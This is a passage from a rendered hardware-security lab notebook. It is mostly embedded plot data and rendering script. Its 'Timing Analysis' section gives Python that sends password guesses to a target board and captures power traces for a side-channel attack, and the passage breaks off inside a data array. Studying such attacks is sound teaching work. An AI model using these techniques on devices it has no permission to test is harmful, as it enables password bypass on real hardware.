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","dtype":"float64","shape":[2000]}},"selected":{"id":"1046","type":"Selection"},"selection_policy":{"id":"1047","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"},{"attributes":{"text":""},"id":"1040","type":"Title"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"c8895b25-1359-4ed5-ab59-a4ed37ac09d4","roots":{"1002":"05a29790-ce79-44df-80d1-faf5032cc7c9"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="92b1b2ab-fc53-4d4a-a4d4-372cef2c97e2" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="4297b7e3-2c2b-4fd3-afff-688c4bb400c4"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#4297b7e3-2c2b-4fd3-afff-688c4bb400c4');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"3fce9700-dcf5-4e01-89da-cd2f5f482789":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1156","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1121","type":"PanTool"},{"id":"1122","type":"WheelZoomTool"},{"id":"1123","type":"BoxZoomTool"},{"id":"1124","type":"SaveTool"},{"id":"1125","type":"ResetTool"},{"id":"1126","type":"HelpTool"},{"id":"1134","type":"CrosshairTool"}]},"id":"1127","type":"Toolbar"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1138","type":"Line"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,